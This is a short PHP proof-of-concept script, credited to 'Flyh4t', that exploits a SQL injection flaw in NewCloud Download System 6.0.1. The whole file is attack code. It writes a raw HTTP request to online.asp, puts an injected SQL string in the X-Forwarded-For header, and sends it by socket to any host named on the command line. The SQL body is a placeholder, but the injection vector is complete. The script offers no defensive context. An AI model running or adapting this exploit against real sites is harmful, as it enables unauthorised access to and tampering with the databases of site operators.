<?php
print_r("
+------------------------------------------------------------------+
POC For SQL Injection Of NewCloud Download System Version 6.0.1
BY  Flyh4t
+------------------------------------------------------------------+
");
if ($argc<3) {
	echo "Usage: php ".$argv[0]." host path \n";
	echo "host:      target server \n";
	echo "path:      path to the System\n";
	echo "Example:\r\n";
	echo "php ".$argv[0]." localhost /\n";
	die;
}
$host=$argv[1];
$path=$argv[2];
$cmd = "1.1.1.1';";
$cmd .="you evil sql codz";
$message = "GET ".$path."/online.asp?id=1"." HTTP/1.1\r\n";
$message .= "Accept: */*\r\n";
$message .= "Accept-Language: zh-cn\r\n";
$message .= "Accept-Encoding: gzip, deflate\r\n";
$message .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"."\r\n";
$message .= "Host: ".$host."\r\n";
$message .= "X-Forwarded-For: ".$cmd."\r\n";
$message .= "Connection: Keep-Alive\r\n";
$message .= "\r\n";
$ock=fsockopen($host,80);
if (!$ock) {
	echo 'No response from '.$host;
	die;
}
fputs($ock,$message);
echo "[+]connected to the site!\r\n";
echo '[+]you codz is: "'.$cmd.'" '."\r\n";
echo "[+]done! send it\r\n";
?>